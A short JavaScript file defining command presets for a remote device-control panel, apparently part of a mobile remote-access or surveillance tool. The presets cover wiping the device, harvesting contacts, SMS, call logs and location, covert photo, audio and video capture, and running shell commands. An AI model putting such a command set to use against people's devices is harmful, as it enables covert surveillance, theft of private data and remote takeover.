export const COMMAND_PRESETS = {
    reboot: { label: "Reboot Device", params: {} },
    lock_device: { label: "Lock Device", params: {} },
    wipe_data: { label: "Wipe Device", params: {} },

    get_device_info: { label: "Fetch Device Info", params: {} },
    get_apps: { label: "Fetch Installed Apps", params: {} },
    get_contacts: { label: "Fetch Contacts", params: {} },
    get_sms: { label: "Fetch SMS", params: {} },
    get_call_logs: { label: "Fetch Call Logs", params: {} },
    get_location: { label: "Fetch Current Location", params: {} },

    screenshot: { label: "Take Screenshot", params: {} },

    take_photo: { label: "Take Photo", params: { camera: "rear" } },
    record_audio: { label: "Record Audio", params: { duration: 10 } },
    record_video: { label: "Record Video", params: { duration: 10 } },

    execute_shell: { label: "Run Shell Command", params: { command: "ls" } },

    send_sms: { label: "Send SMS", params: { to: "", message: "" } },
    make_call: { label: "Make Call", params: { number: "" } },

    check_update: { label: "Check for Update", params: {} },
    download_update: { label: "Download App Update", params: {} },
    install_update: { label: "Install App Update", params: {} }
};
